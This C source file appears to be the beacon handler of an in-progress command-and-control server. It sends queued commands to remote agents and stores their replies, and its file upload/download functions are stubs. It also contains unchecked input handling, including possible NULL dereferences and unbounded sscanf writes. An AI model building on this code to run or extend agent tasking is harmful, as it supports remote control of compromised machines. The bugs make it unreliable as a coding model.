#include "beacon_tcp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <pthread.h>
#include <cjson/cJSON.h>
#include <openssl/sha.h>

#include "db.h"
#include "logs.h"

void download(char *file) {
    printf("hello\n");
}

void upload(char *file) {
    printf("hello\n");
}

void beacon(cJSON *json, int sock) {
    cJSON *agent_id = cJSON_GetObjectItem(json, "agent_id");
    // log
    log_beacon(agent_id->valuestring);


    cJSON *json_reply = cJSON_CreateObject();

    // update last seen
    update_last_seen(agent_id->valuestring);
    // validate if agent id exists in the database.
    
    // check if there are tasks queue for agent
    // change this so that it stores all qeues in a data structure to optimize 
    int task_id = check_tasks_queue(agent_id->valuestring);
    if (task_id == -1) {
        cJSON_AddStringToObject(json_reply, "mode", "none");
        char *reply = cJSON_Print(json_reply);
        send(sock, reply, strlen(reply), 0);
        free(reply);
        cJSON_Delete(json_reply);
        return;
    } else {
        char *cmd =  get_task(task_id);
        if (cmd != NULL) {
            cJSON_AddStringToObject(json_reply, "command", cmd);
        } else {
            cJSON_AddStringToObject(json_reply, "command", "NULL");  // or "noop", or don't add it
        }
        cJSON_AddStringToObject(json_reply, "mode", "task");
        //cJSON_AddStringToObject(json_reply, "task_id", task_id);
        cJSON_AddNumberToObject(json_reply, "task_id", task_id);
        cJSON_AddStringToObject(json_reply, "agent_id", agent_id->valuestring);
        


        
        char *reply = cJSON_Print(json_reply);
        send(sock, reply, strlen(reply), 0);

        
        // if command = "upload [file path]" | upload file to agent 
        // if command = "download [file path]" | download file from agent
        if (strncmp(cmd, "download", 8) ==0 || strncmp(cmd, "upload", 6) == 0) {
            char file[BUFFER_SIZE];
            char command[BUFFER_SIZE];
            if (sscanf(cmd, "%s %s", command, file) == 2) {
                if (strncmp(command, "download", 8) == 0) {
                    download(file);
                } else {
                    upload(file);
                }
            }
        }
        free(cmd);
        // recv response and log to database
        // buffer response
        // respose with result
        char buffer[MAX_RESPONSE];
        int bytes_received = recv(sock, buffer, sizeof(buffer) -1, 0);
        if (bytes_received <= 0) {
            perror("recv failed (beacon func)");
            return;
        }
        buffer[bytes_received] = '\0'; 
    
        cJSON *response = cJSON_Parse(buffer);
        if (!response) {
            printf("Error parsing JSON!\n");
            return;
        }


        cJSON *command_response = cJSON_GetObjectItem(response, "response");
        store_task_response(command_response->valuestring, task_id);
        cJSON_Delete(response);

        // store response in database
        
        free(reply);
        cJSON_Delete(json_reply);
    }

    
}
